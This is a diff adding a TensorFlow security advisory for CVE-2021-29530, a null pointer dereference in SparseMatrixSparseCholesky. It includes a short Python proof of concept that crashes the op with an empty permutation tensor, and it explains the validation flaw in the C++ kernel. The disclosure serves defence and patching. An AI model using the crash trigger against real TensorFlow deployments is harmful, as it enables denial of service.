@@ -1,0 +1,67 @@
+<h2>TFSA-2021-018: Invalid validation in <code>SparseMatrixSparseCholesky</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29530</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a null pointer dereference by providing an invalid
+<code>permutation</code> to <code>tf.raw_ops.SparseMatrixSparseCholesky</code>:</p>
+<p>```python
+import tensorflow as tf
+import numpy as np
+from tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops</p>
+<p>indices_array = np.array([[0, 0]])
+value_array = np.array([-10.0], dtype=np.float32)
+dense_shape = [1, 1]
+st = tf.SparseTensor(indices_array, value_array, dense_shape)</p>
+<p>input = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(
+       st.indices, st.values, st.dense_shape)</p>
+<p>permutation = tf.constant([], shape=[1, 0], dtype=tf.int32)</p>
+<p>tf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86">implementation</a> fails to properly validate the input arguments:</p>
+<p>```cc
+void Compute(OpKernelContext<em> ctx) final {
+  ...
+  const Tensor&amp; input_permutation_indices = ctx-&gt;input(1);
+  ...
+  ValidateInputs(ctx, </em>input_matrix, input_permutation_indices, &amp;batch_size, &amp;num_rows);
+  ...
+}</p>
+<p>void ValidateInputs(OpKernelContext<em> ctx,
+    const CSRSparseMatrix&amp; sparse_matrix,
+    const Tensor&amp; permutation_indices, int</em> batch_size,
+    int64* num_rows) {
+  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value, ...)
+  ...
+}
+```</p>
+<p>Although <code>ValidateInputs</code> is called and there are checks in the body of this
+function, the code proceeds to the next line in <code>ValidateInputs</code> since
+<a href="https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48"><code>OP_REQUIRES</code></a>
+is a macro that only exits the current function.</p>
+<p><code>cc
+#define OP_REQUIRES(CTX, EXP, STATUS)                     \
+  do {                                                    \
+    if (!TF_PREDICT_TRUE(EXP)) {                          \
+      CheckNotInComputeAsync((CTX), "OP_REQUIRES_ASYNC"); \
+      (CTX)-&gt;CtxFailure(__FILE__, __LINE__, (STATUS));    \
+      return;                                             \
+    }                                                     \
+  } while (0)</code></p>
+<p>Thus, the first validation condition that fails in <code>ValidateInputs</code> will cause
+an early return from that function. However, the caller will continue execution
+from the next line. The fix is to either explicitly check <code>context-&gt;status()</code>
+or to convert <code>ValidateInputs</code> to return a <code>Status</code>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd">e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.</p>
